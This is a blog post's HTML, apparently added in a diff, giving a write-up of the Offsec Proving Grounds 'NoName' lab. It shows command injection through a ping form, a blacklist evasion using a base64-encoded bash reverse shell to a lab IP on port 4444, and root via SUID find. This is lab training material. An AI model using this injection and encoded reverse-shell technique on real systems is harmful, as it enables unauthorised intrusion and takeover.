@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Offsec Proving Grounds NoName write-up · Degen
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="degenware">
+<meta name="description" content="Starting with basic enumeration
+
+Only port 80 is open so let’s see what’s there
+
+It seems like some remote code execution. Lets test it by putting &rsquo;test&rsquo; value. We get a &lsquo;Fake ping executed&rsquo; message so the assumption is that the command ping &lt; value &gt; gets executed on the backend. Trying to execute another command by inputting &lsquo;; whoami&rsquo; , &lsquo;| whoami&rsquo; or &lsquo;&amp;&amp; whoami&rsquo; doesn’t return anything though. Let’s enumerate further">
+<meta name="keywords" content="blog,cybersecurity,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Offsec Proving Grounds NoName write-up">
+  <meta name="twitter:description" content="Starting with basic enumeration
+Only port 80 is open so let’s see what’s there
+It seems like some remote code execution. Lets test it by putting ’test’ value. We get a ‘Fake ping executed’ message so the assumption is that the command ping &lt; value &gt; gets executed on the backend. Trying to execute another command by inputting ‘; whoami’ , ‘| whoami’ or ‘&amp;&amp; whoami’ doesn’t return anything though. Let’s enumerate further">
+
+<meta property="og:url" content="http://localhost:1313/posts/noname/">
+  <meta property="og:site_name" content="Degen">
+  <meta property="og:title" content="Offsec Proving Grounds NoName write-up">
+  <meta property="og:description" content="Starting with basic enumeration
+Only port 80 is open so let’s see what’s there
+It seems like some remote code execution. Lets test it by putting ’test’ value. We get a ‘Fake ping executed’ message so the assumption is that the command ping &lt; value &gt; gets executed on the backend. Trying to execute another command by inputting ‘; whoami’ , ‘| whoami’ or ‘&amp;&amp; whoami’ doesn’t return anything though. Let’s enumerate further">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-06-14T07:07:07+01:00">
+    <meta property="article:modified_time" content="2024-06-14T07:07:07+01:00">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/noname/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.ico" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.ico" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      Degen
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Posts</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/noname/">
+              Offsec Proving Grounds NoName write-up
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2024-06-14T07:07:07&#43;01:00">
+                June 14, 2024
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              2-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p>Starting with basic enumeration</p>
+<p><img src="images/img1.png" alt="alt"></p>
+<p>Only port 80 is open so let’s see what’s there</p>
+<p><img src="images/img2.png" alt="alt"></p>
+<p>It seems like some remote code execution. Lets test it by putting &rsquo;test&rsquo; value. We get a &lsquo;Fake ping executed&rsquo; message so the assumption is that the command ping &lt; value &gt; gets executed on the backend. Trying to execute another command by inputting &lsquo;; whoami&rsquo; , &lsquo;| whoami&rsquo; or &lsquo;&amp;&amp; whoami&rsquo; doesn’t return anything though. Let’s enumerate further</p>
+<p><img src="images/img3.png" alt="alt"></p>
+<p>superadmin.php seems interesting</p>
+<p><img src="images/img4.png" alt="alt"></p>
+<p>Here we have the script that actually performs ping command and we have code execution. After entering &lsquo;| whoami&rsquo; we get &lsquo;www-data&rsquo; returned</p>
+<p><img src="images/img5.png" alt="alt"></p>
+<p>However when trying to input one line reverse shells nothing happened. This plus the fact that only &lsquo;|&rsquo; worked and for example &lsquo;;&rsquo; didn’t, made me believe there is a blacklist. By entering &lsquo;| cat superadmin.php&rsquo; and viewing page source we can see the code of the script</p>
+<p><img src="images/img6.png" alt="alt"></p>
+<p>Now we know why we can’t inject a plain reverse shell code. Let’s encode it then</p>
+<p><img src="images/img7.png" alt="alt"></p>
+<p>Now we need to make the target machine decode and execute the code. As ‘bash’ wasn’t in the blacklist, the command below got us a reverse shell</p>
+<blockquote>
+<p>bash -c &ldquo;$(echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xODEvNDQ0NCAwPiYx|base64 -d)&rdquo;</p>
+</blockquote>
+<p><img src="images/img8.png" alt="alt"></p>
+<p><strong>Privilege Escalation</strong></p>
+<p>sudo -l didn’t return anything interesting, let’s try ‘find / -perm -u=s -type f 2&gt;/dev/null’ to see what programs have SUID bit set</p>
+<p><img src="images/img9.png" alt="alt"></p>
+<p>By going to <a href="https://gtfobins.github.io/gtfobins/find/#suid"  class="external-link" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/find/#suid</a> we find (see what I did there) an easy way to get root</p>
+<p><img src="images/img10.png" alt="alt"></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2024
+     degenware 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
